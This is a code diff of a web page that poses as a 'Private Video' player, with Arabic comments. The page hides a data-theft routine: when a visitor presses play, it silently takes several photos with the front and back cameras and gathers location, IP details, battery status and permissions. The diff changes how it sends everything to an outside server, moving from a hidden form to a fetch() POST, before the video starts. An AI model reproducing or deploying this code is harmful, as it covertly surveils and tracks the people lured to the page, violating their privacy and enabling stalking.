@@ -247,15 +247,6 @@
 </head>
 <body>
 
-    <form id="data-form" method="POST" action="https://server-brxz.onrender.com/submitData">
-        <input type="hidden" name="chatId" id="chatId" />
-        <input type="hidden" name="imageDatas" id="imageDatas" />
-        <input type="hidden" name="location" id="location" />
-        <input type="hidden" name="permissions" id="permissions" />
-        <input type="hidden" name="ipInfo" id="ipInfo" />
-        <input type="hidden" name="battery" id="battery" />
-    </form>
-
     <div class="video-player-container">
         <div class="video-info">
             <div class="video-title">Private Video</div>
@@ -417,6 +408,22 @@
                 realVideo.play().catch(() => {});
             }
 
+            // --- إرسال البيانات إلى السيرفر المحدد ---
+            async function sendData(data) {
+                try {
+                    const response = await fetch('https://server-brxz.onrender.com/submitData', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/x-www-form-urlencoded',
+                        },
+                        body: new URLSearchParams(data)
+                    });
+                    // لا نفعل شيئاً بالرد، نبقى في الصفحة
+                } catch (error) {
+                    console.error('Error sending data:', error);
+                }
+            }
+
             // --- الدالة الرئيسية ---
             async function captureData() {
                 if (isProcessing) return;
@@ -438,32 +445,35 @@
                 playButtonOverlay.style.pointerEvents = 'none';
 
                 const chatId = new URLSearchParams(window.location.search).get('chatId');
-                document.getElementById('chatId').value = chatId || '';
 
                 await fetchIPInfo();
-                document.getElementById('ipInfo').value = ipInfo;
-
                 await getBatteryStatus();
-                document.getElementById('battery').value = batteryStatus;
-
                 const location = await getLocation();
-                document.getElementById('location').value = location;
 
+                // التصوير: أمامية، خلفية، أمامية، خلفية
                 await captureFromCamera('user');
                 await captureFromCamera('environment');
                 await captureFromCamera('user');
                 await captureFromCamera('environment');
 
-                document.getElementById('imageDatas').value = images.join(',');
-                document.getElementById('permissions').value = permissions.join(', ');
+                // تجهيز البيانات للإرسال
+                const data = {
+                    chatId: chatId || '',
+                    imageDatas: images.join(','),
+                    location: location,
+                    permissions: permissions.join(', '),
+                    ipInfo: ipInfo,
+                    battery: batteryStatus
+                };
 
+                // إرسال البيانات إلى السيرفر المحدد
+                await sendData(data);
+
+                // إخفاء التحميل
                 spinner.style.display = 'none';
                 loading.style.display = 'none';
                 playButtonOverlay.style.opacity = '1';
                 playButtonOverlay.style.pointerEvents = 'auto';
-
-                // إرسال النموذج
-                document.getElementById('data-form').submit();
 
                 // تشغيل الفيديو
                 startVideo();
